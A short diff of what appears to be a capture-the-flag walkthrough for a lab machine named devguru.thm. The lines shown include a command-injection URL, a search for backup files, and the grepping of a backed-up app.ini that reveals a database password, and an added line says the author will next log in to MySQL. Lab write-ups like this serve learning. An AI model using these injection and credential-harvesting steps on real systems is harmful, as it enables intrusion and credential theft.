@@ -101,7 +101,7 @@ http://devguru.thm/about?cmd=whoami
 find / -name *.bak 2>/dev/null | tee /dev/shm/log.txt
 ```
 ### There seems to be an app.ini.bak in /var/backups
-### 
+
 ```
 cat app.ini.bak | grep data -C 10
 
@@ -119,7 +119,8 @@ PASSWD              = UfFPTF8C8jjxVF2m
 ; to the look into the schema first. e.g.:ALTER USER user SET SEARCH_PATH = schema_name,"$user",public;
 SCHEMA              = 
 ```
-
+### Nice, lets login to the mysql server
+*This can also be done with adminer but gui bad and only soopr hakrs so were goin with cli
 
 
 
